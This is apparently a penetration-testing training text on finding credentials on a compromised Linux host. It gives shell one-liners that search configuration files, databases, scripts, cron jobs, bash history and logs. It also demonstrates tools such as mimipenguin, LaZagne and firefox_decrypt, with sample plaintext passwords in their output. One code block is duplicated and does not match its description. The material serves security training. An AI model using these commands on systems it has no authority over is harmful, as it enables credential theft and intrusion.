There are several sources that can provide us with credentials that we put in four categories. These include, but are not limited to:
- `Files` including configs, databases, notes, scripts, source code, cronjobs, and SSH keys
- `History` including logs, and command-line history
- `Memory` including cache, and in-memory processing
- `Key-rings` such as browser stored credentials
Usually, the configuration files are marked with the following three file extensions (`.config`, `.conf`, `.cnf`). However, these configuration files or the associated extension files can be renamed, which means that these file extensions are not necessarily required.


#### Searching for configuration files
```shell
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

Another option is to run the scan directly for each file found with the specified file extension and output the contents. In this example, we search for three words (`user`, `password`, `pass`) in each file with the file extension `.cnf`.
```shell
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

#### Searching for databases
We can apply this simple search to the other file extensions as well. Additionally, we can apply this search type to databases stored in files with different file extensions, and we can then read those.

```shell
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

#### Searching for notes
```shell
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

#### Searching for scripts
```shell
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

#### Enumerating cronjobs
Cronjobs are independent execution of commands, programs, scripts. These are divided into the system-wide area (`/etc/crontab`) and user-dependent executions. Some applications and scripts require credentials to run and are therefore incorrectly entered in the cronjobs. Furthermore, there are the areas that are divided into different time ranges (`/etc/cron.daily`, `/etc/cron.hourly`, `/etc/cron.monthly`, `/etc/cron.weekly`). The scripts and files used by `cron` can also be found in `/etc/cron.d/` for Debian-based distributions.

```shell
> cat /etc/crontab 

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
```

```shell
> ls -la /etc/cron.*/

/etc/cron.d/:
total 28

```

#### Enumerating history files
In the history of the commands entered on Linux distributions that use Bash as a standard shell, we find the associated files in `.bash_history`. Nevertheless, other files like `.bashrc` or `.bash_profile` can contain important information.

```shell
> tail -n5 /home/*/.bash*

==> /home/cry0l1t3/.bash_history <==
vim ~/testing.txt
vim ~/testing.txt
chmod 755 /tmp/api.py
su
/tmp/api.py cry0l1t3 6mX4UP1eWH3HXK

==> /home/cry0l1t3/.bashrc <==
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
```

#### Enumerating log files
An essential concept of Linux systems is log files that are stored in text files.

|**File**|**Description**|
|---|---|
|`/var/log/messages`|Generic system activity logs.|
|`/var/log/syslog`|Generic system activity logs.|
|`/var/log/auth.log`|(Debian) All authentication related logs.|
|`/var/log/secure`|(RedHat/CentOS) All authentication related logs.|
|`/var/log/boot.log`|Booting information.|
|`/var/log/dmesg`|Hardware and drivers related information and logs.|
|`/var/log/kern.log`|Kernel related warnings, errors and logs.|
|`/var/log/faillog`|Failed login attempts.|
|`/var/log/cron`|Information related to cron jobs.|
|`/var/log/mail.log`|All mail server related logs.|
|`/var/log/httpd`|All Apache related logs.|
|`/var/log/mysqld.log`|All MySQL server related logs.|
Here are some strings we can use to find interesting content in the logs:
```shell
 for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

## Memory and cache
#### Mimipenguin
Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused.
In order to retrieve this type of information from Linux distributions, there is a tool called [mimipenguin](https://github.com/huntergregal/mimipenguin) that makes the whole process easier. However, this tool requires administrator/root permissions.
```shell
> python3 mimipenguin.py

[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY
```

#### LaZagne
An even more powerful tool we can use that was mentioned earlier in the Credential Hunting in Windows section is `LaZagne`.
```shell
> python3 laZagne.py all

```

#### Browser credentials
Browsers store the passwords saved by the user in an encrypted form locally on the system to be reused. For example, the `Mozilla Firefox` browser stores the credentials encrypted in a hidden folder for the respective user.

```shell
ls -l .mozilla/firefox/ | grep default 

drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default
```

```shell
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

{
  "nextId": 2,
  "logins": [
    {
      "id": 1,
      "hostname": "https://www.inlanefreight.com",
      "httpRealm": null,
      "formSubmitURL": "https://www.inlanefreight.com",
      "usernameField": "username",
      "passwordField": "password",
      "encryptedUsername": "MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr",
      "encryptedPassword": "MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=",
      "guid": "{412629aa-4113-4ff9-befe-dd9b4ca388e2}",
      "encType": 1,
      "timeCreated": 1643373110869,
      "timeLastUsed": 1643373110869,
      "timePasswordChanged": 1643373110869,
      "timesUsed": 1
    }
  ],
  "potentiallyVulnerablePasswords": [],
  "dismissedBreachAlertsByLoginGUID": {},
  "version": 3
}
```
The tool [Firefox Decrypt](https://github.com/unode/firefox_decrypt) is excellent for decrypting these credentials, and is updated regularly. It requires Python 3.9 to run the latest version. Otherwise, `Firefox Decrypt 0.7.0` with Python 2 must be used.

```shell
python3.9 firefox_decrypt.py

Select the Mozilla profile you wish to decrypt
1 -> lfx3lvhb.default
2 -> 1bplpd86.default-release

Username: 'test'
Password: 'test'

```

Alternatively, `LaZagne` can also return results if the user has used the supported browser.
```shell
python3 laZagne.py browsers
```
